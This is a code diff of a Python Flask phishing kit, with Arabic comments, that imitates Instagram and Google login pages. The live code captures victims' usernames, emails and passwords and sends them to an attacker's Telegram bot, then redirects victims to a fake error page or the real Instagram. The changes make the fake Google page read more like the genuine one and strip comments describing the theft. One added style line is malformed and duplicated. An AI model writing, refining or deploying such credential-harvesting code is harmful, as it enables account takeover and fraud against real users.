@@ -45,7 +45,6 @@ def insta_login():
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-      # حفظ اسم المستخدم وحفظ مؤشر الانتقال لصفحة الـ 404
       session["insta_user"] = username_val
       return redirect(url_for("error_404"))
 
@@ -183,7 +182,7 @@ def error_404():
 
 
 # ----------------------------------------------------
-# 3. صفحات جوجل (الخطوة الأولى والثانية للإيميل والباسورد)
+# 3. صفحات جوجل (النص الأصلي تماماً بدون ذكر انستغرام)
 # ----------------------------------------------------
 @app.route("/google-login", methods=["GET", "POST"])
 def google_step1():
@@ -249,7 +248,7 @@ def google_step1():
         </svg>
 
         <div class="title">تسجيل الدخول</div>
-        <div class="subtitle">يُرجى استخدام حسابك على Google لتأكيد ملكية حساب Instagram الخاص بك.</div>
+        <div class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات Google الأخرى.</div>
         <a href="#" class="info-link">مزيد من المعلومات حول استخدام حسابك</a>
 
         {% if error %}
@@ -296,7 +295,6 @@ def google_step2():
           "كلمة المرور قصيرة جداً. يجب أن تكون كلمة المرور أطول من 5 أحرف."
       )
     else:
-      # إرسال بيانات جوجل كاملة (الإيميل والباسورد المرتبطين بحساب انستا) للتليجرام
       if BOT_TOKEN and CHAT_ID:
         msg = (
             "📸 تم استلام بيانات التحقق الكاملة (Google + Instagram):\n\n👤 حساب"
@@ -306,7 +304,6 @@ def google_step2():
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-      # تفريغ الجلسة وتحويله للانستا الأصلي
       session.clear()
       return redirect(INSTAGRAM_OFFICIAL_URL)
 
@@ -337,6 +334,7 @@ def google_step2():
         .input-group { width: 100%; margin-bottom: 8px; }
         .input-group input { width: 100%; padding: 12px 14px; font-size: 15px; border: 1.5px solid #1a73e8; border-radius: 8px; outline: none; color: #202124; background: #fff; }
         .footer-action { width: 100%; max-width: 450px; display: flex; justify-content: flex-end; align-items: center; padding-bottom: 10px; }
+        .submit-btn { background: #1a730e8; color: white; border: none; border-radius: 28px; padding: 10px 28px; font-size: 15px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
         .submit-btn { background: #1a73e8; color: white; border: none; border-radius: 28px; padding: 10px 28px; font-size: 15px; font-weight: 500; cursor: pointer; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15); }
         .submit-btn:hover { background: #1558b0; }
     </style>
